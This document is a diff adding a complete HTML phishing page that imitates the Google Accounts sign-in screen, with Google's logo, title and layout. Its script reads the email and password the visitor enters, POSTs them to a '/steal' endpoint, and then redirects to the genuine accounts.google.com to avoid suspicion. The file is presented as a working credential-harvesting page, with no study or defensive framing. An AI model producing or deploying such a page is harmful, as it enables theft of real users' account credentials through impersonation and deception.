@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #ffffff;
+            color: #202124;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+            background-color: #fff;
+        }
+
+        .logo {
+            width: 75px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+        }
+
+        .subtitle {
+            margin-top: 10px;
+            margin-bottom: 32px;
+            font-size: 16px;
+            color: #202124;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        input {
+            width: 100%;
+            height: 54px;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            background-color: #fff;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+            padding: 13px 15px;
+        }
+
+        .link {
+            display: inline-block;
+            margin-top: 2px;
+            margin-bottom: 28px;
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .info-text {
+            text-align: left;
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .bottom-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        button {
+            min-width: 88px;
+            height: 36px;
+            padding: 0 24px;
+            border: none;
+            border-radius: 4px;
+            background-color: #1a73e8;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #1765cc;
+        }
+
+        #msg {
+            margin-top: 18px;
+            min-height: 18px;
+            font-size: 14px;
+            color: #d93025;
+            text-align: left;
+        }
+
+        .footer {
+            width: 100%;
+            max-width: 450px;
+            margin-top: 18px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #5f6368;
+            margin-left: 16px;
+        }
+
+        .page-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            padding: 24px;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                align-items: flex-start;
+                background-color: #fff;
+            }
+
+            .container {
+                border: none;
+                padding: 32px 24px;
+                max-width: 100%;
+            }
+
+            .footer {
+                padding: 0 24px;
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <div class="container">
+            <img
+                class="logo"
+                src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+                alt="Google"
+            >
+
+            <h1>Sign in</h1>
+            <div class="subtitle">Use your Google Account</div>
+
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Email or phone">
+            </div>
+
+            <a href="#" class="link">Forgot email?</a>
+
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Enter your password">
+            </div>
+
+            <div class="info-text">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#">Learn more</a>
+            </div>
+
+            <div class="bottom-row">
+                <a href="#" class="create-account">Create account</a>
+                <button onclick="login()">Next</button>
+            </div>
+
+            <p id="msg"></p>
+        </div>
+
+        <div class="footer">
+            <div>English (United States)</div>
+            <div>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function login() {
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const msg = document.getElementById("msg");
+
+            if (!username || !password) {
+                msg.innerText = "Enter your email and password.";
+                return;
+            }
+
+            msg.style.color = "#5f6368";
+            msg.innerText = "Signing in...";
+
+            fetch("/steal", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then((response) => {
+                if (!response.ok) {
+                    throw new Error("Request failed");
+                }
+
+                setTimeout(() => {
+                    window.location.href = "https://accounts.google.com";
+                }, 1000);
+            })
+            .catch(() => {
+                msg.style.color = "#d93025";
+                msg.innerText = "Network error. Please try again.";
+            });
+        }
+    </script>
+</body>
+</html>
